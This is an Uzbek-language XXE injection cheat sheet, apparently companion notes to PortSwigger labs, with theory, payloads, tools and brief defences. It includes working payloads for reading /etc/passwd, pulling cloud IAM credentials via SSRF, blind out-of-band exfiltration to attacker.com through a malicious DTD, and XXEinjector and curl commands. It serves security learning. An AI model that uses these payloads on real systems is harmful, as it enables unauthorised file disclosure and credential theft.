# XML External Entity (XXE) Injection

> Lab yechimlari (PortSwigger'ning 9 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
XML formatida "entity" degan narsa bor — qisqartma kabi (`&xxe;`). XML spetsifikatsiyasi
**external entity** ga ruxsat beradi: entity qiymatini tashqi manbadan (`SYSTEM "file:///..."`
yoki `http://...`) olish. Agar ilovaning XML parseri external entity'ni **o'chirmagan** bo'lsa,
sen XML ichiga maxsus DOCTYPE/entity tiqasan va server senga fayl o'qib beradi yoki tarmoqqa
so'rov yuboradi.

**Ildiz sabab:** eski/default XML parserlarda DTD va external entity yoqilgan. Ishonchsiz XML'ni
shunday parser o'qisa, "data" ichidagi entity "server harakati" ga aylanadi (fayl o'qish, SSRF).

## Turlari
- **Classic (in-band) file read** — entity javobda aks etadi → `/etc/passwd` to'g'ridan ko'rinadi.
- **XXE → SSRF** — `http://` entity bilan ichki/cloud metadata'ga so'rov.
- **Blind XXE (OOB)** — javob ko'rinmaydi → external DTD + DNS/HTTP (Collaborator) orqali exfil.
- **Error-based** — ma'lumotni DB/parser xato matniga majburan chiqarasan.
- **XInclude** — to'liq XML'ni boshqarolmasang, bitta parametrga `xi:include`.
- **XXE via file upload** — SVG/DOCX/XLSX ichidagi XML orqali.
- **Local DTD repurposing** — tashqi DTD bloklangan bo'lsa serverdagi mavjud DTD'ni qayta ishlatish.

## Oqibatlar (IMPACT)
- **Server fayllarini o'qish**: `/etc/passwd`, config, source kod, secret, SSH key.
- **SSRF** — ichki servis, cloud metadata (`169.254.169.254`) → AWS/IAM kalit = Critical.
- **OOB exfiltration** — javob chiqmasa ham ma'lumotni tashqariga sug'urish.
- Ba'zan **RCE** (PHP `expect://`), yoki **DoS** (billion laughs).
> Fayl o'qish + SSRF = odatda **High/Critical**.

## Qayerdan qidiriladi
`Content-Type: application/xml`/`text/xml` so'rovlar, SOAP, SAML, RSS, SVG upload,
DOCX/XLSX/PDF ichidagi XML. **JSON endpointda ham Content-Type'ni `application/xml`ga o'zgartirib sina!**

## Aniqlash
```xml
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe "SALOM123"> ]>
<root><data>&xxe;</data></root>
```
> Javobda `SALOM123` chiqsa — entity ishlayapti, keyingi bosqichga o't.

## Exploit
```xml
<!-- Fayl o'qish -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>

<!-- SSRF → cloud metadata -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>

<!-- PHP source (base64) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/config.php">
```

### Blind XXE — OOB (javob chiqmasa)
So'rovda:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
```
Sening serveringdagi `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
> `/etc/passwd` tarkibi sening serveringga HTTP callback orqali keladi.

## SVG orqali (fayl upload)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>
```

## TOOLLAR

### interactsh — OOB callback ushlagich
```bash
interactsh-client
```
> Senga unikal domen beradi (`xxx.oast.pro`). Blind XXE'da shu domenni ishlatasan, fayl tarkibi DNS/HTTP so'rov bo'lib shu yerga tushadi.

### XXEinjector — avtomat fayl sug'urish
```bash
ruby XXEinjector.rb --host=attacker.com --path=/etc/passwd --file=request.txt
```
> Burp request faylidagi XML'ga entity joylab, OOB kanal bilan faylni avtomat tortadi.

### Burp Collaborator — OOB (interactsh o'rniga)
```
Burp → Collaborator → domen ol → evil.dtd'da ishlat → pollingда callback ko'r
```
> Blind XXE'ni isbotlashning eng oson yo'li — DNS/HTTP so'rov keladi.

### curl — qo'lda inject
```bash
curl -s https://target.com/api -H "Content-Type: application/xml" --data-binary @payload.xml
```
> Tayyor XXE payloadni to'g'ridan-to'g'ri yuborib javobni ko'rasan (Content-Type trick shu yerda).

## PoC
Oddiy entity bilan `/etc/passwd` yoki `/etc/hostname` o'qilishini ko'rsat. Blind bo'lsa
interactsh callback'ni ko'rsat.

## Himoya
External entity/DTD'ni o'chir (asosiy), `disallow-doctype-decl` (Java),
`libxml_disable_entity_loader(true)` (eski PHP), imkon bo'lsa XML o'rniga JSON.
